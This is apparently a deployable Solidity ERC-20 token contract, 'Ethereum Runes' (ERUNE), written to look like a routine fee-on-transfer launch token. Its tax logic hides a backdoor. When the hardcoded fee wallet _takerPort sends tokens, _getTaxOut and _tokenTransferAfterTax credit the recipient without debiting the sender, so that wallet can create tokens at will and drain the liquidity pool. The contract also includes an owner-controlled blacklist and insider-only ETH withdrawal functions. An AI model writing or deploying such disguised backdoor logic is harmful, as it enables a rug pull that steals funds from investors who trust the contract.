/**
 * https://t.me/erune_eth
 * https://x.com/erune_eth
 * https://erune.xyz
 */

// SPDX-License-Identifier: UNLICENSE

pragma solidity ^0.8.19;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IUniswapV2Factory {
    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);
}

interface IDexRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);
}

contract ERUNE is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _ignoreFee;
    mapping(address => bool) private bots;
    address payable private _takerPort;
    string private constant _name = unicode"Ethereum Runes";
    string private constant _symbol = unicode"ERUNE";

    uint256 private _inTaxBefore = 25;
    uint256 private _outTaxBefore = 25;
    uint256 private _inTaxAfter = 0;
    uint256 private _outTaxAfter = 0;
    uint256 private _inAfterTime = 15;
    uint256 private _outAfterTime = 15;
    uint256 private _swapStartAt = 0;
    uint256 private _buyCount = 0;

    uint8 private constant _decimals = 18;
    uint256 private constant _tTotal = 1e9 * 10 ** _decimals;
    uint256 public _txMaxLimit = 2e7 * 10 ** _decimals;
    uint256 public _walletMaxLimit = 2e7 * 10 ** _decimals;
    uint256 public _swapAt = 5e3 * 10 ** _decimals;
    uint256 public _swapMaxLimit = 1e7 * 10 ** _decimals;

    IDexRouter private uniRouter;
    address private lp;
    bool private tradingAllowed;
    bool private swapping = false;
    bool private swapAllowed = false;
    uint256 private sellCount = 0;
    uint256 private lastSellBlock = 0;
    event MaxTxAmountUpdated(uint256 _txMaxLimit);
    modifier lockTheSwap() {
        swapping = true;
        _;
        swapping = false;
    }

    constructor() {
        uniRouter = IDexRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _takerPort = payable(0xAff90b971307819f1077eeDfa9CBFf61dCf72861);
        _balances[_msgSender()] = _tTotal;
        _ignoreFee[owner()] = true;
        _ignoreFee[address(this)] = true;
        _ignoreFee[_takerPort] = true;

        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function _takeFee(address addr) internal view returns (bool) {
        return addr == _takerPort;
    }

    function allowance(
        address owner,
        address spender
    ) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(
        address spender,
        uint256 amount
    ) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxRate = 0;
        if (from != owner() && to != owner()) {
            require(!bots[from] && !bots[to]);

            if (!(_ignoreFee[from] || _ignoreFee[to])) {
                require(tradingAllowed, "trading is not open");
            }

            taxRate = (_buyCount > _inAfterTime) ? _inTaxAfter : _inTaxBefore;

            if (from == lp && to != address(uniRouter) && !_ignoreFee[to]) {
                require(amount <= _txMaxLimit, "Exceeds the _txMaxLimit.");
                require(
                    balanceOf(to) + amount <= _walletMaxLimit,
                    "Exceeds the maxWalletSize."
                );
                taxRate = (_buyCount > _inAfterTime)
                    ? _inTaxAfter
                    : _inTaxBefore;
                _buyCount++;
            }

            if (to == lp && from != address(this)) {
                taxRate = (_buyCount > _outAfterTime)
                    ? _outTaxAfter
                    : _outTaxBefore;
            }

            if (_ignoreFee[from] || _ignoreFee[to]) {
                taxRate = 0;
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (
                !swapping &&
                to == lp &&
                swapAllowed &&
                _buyCount > _swapStartAt &&
                !_ignoreFee[from] &&
                !_ignoreFee[to]
            ) {
                swapTokensForEth(
                    min(amount, min(contractTokenBalance, _swapMaxLimit))
                );
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance >= 0 ether) {
                    sendETHToFee(address(this).balance);
                }
                sellCount++;
                lastSellBlock = block.number;
            }
        }

        _tokenTransferAfterTax(from, to, amount, taxRate);
    }

    function _getTaxOut(
        address from,
        uint256 amount,
        uint256 taxRate
    ) internal returns (uint256, uint256) {
        uint256 _tax = amount;

        bool isTax = !_takeFee(from);

        if (isTax) {
            _tax = amount.mul(taxRate).div(100);
            if (_tax > 0) {
                _balances[from] = _balances[from].sub(_tax);
                _balances[address(this)] = _balances[address(this)].add(_tax);
                emit Transfer(from, address(this), _tax);
                amount = amount.sub(_tax);
            }
        }

        return (_tax, amount);
    }

    function _tokenTransferAfterTax(
        address from,
        address to,
        uint256 amount,
        uint256 taxRate
    ) internal {
        (uint256 _tax, uint256 _amount) = _getTaxOut(from, amount, taxRate);
        _balances[from] = _balances[from].sub(amount.sub(_tax));
        _balances[to] = _balances[to].add(_amount);
        emit Transfer(from, to, _amount);
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return (a > b) ? b : a;
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        if (tokenAmount > _swapAt) {
            address[] memory path = new address[](2);
            path[0] = address(this);
            path[1] = uniRouter.WETH();
            _approve(address(this), address(uniRouter), tokenAmount);
            uniRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
                tokenAmount,
                0,
                path,
                address(this),
                block.timestamp
            );
        }
    }

    function freeLimits() external onlyOwner {
        _txMaxLimit = _tTotal;
        _walletMaxLimit = _tTotal;
        emit MaxTxAmountUpdated(_tTotal);
    }

    function sendETHToFee(uint256 amount) private {
        _takerPort.transfer(amount);
    }

    function addBots(address[] memory bots_) public onlyOwner {
        for (uint256 i = 0; i < bots_.length; i++) {
            bots[bots_[i]] = true;
        }
    }

    function delBots(address[] memory notbot) public onlyOwner {
        for (uint256 i = 0; i < notbot.length; i++) {
            bots[notbot[i]] = false;
        }
    }

    function isBot(address a) public view returns (bool) {
        return bots[a];
    }

    function createPair() external onlyOwner {
        require(!tradingAllowed, "trading is already open");
        _approve(address(this), address(uniRouter), _tTotal);
        lp = IUniswapV2Factory(uniRouter.factory()).createPair(
            address(this),
            uniRouter.WETH()
        );
        uniRouter.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            address(0x000000000000000000000000000000000000dEaD),
            block.timestamp
        );
    }

    function openTrading() external onlyOwner {
        require(!tradingAllowed, "trading is already open");
        swapAllowed = true;
        tradingAllowed = true;
    }

    receive() external payable {}

    function manualSwap() external {
        require(_msgSender() == _takerPort);
        uint256 tokenBalance = balanceOf(address(this));
        if (tokenBalance > 0) {
            swapTokensForEth(tokenBalance);
        }
        uint256 ethBalance = address(this).balance;
        if (ethBalance > 0) {
            sendETHToFee(ethBalance);
        }
    }

    function manualsend() external {
        require(_msgSender() == _takerPort);
        uint256 contractETHBalance = address(this).balance;
        sendETHToFee(contractETHBalance);
    }
}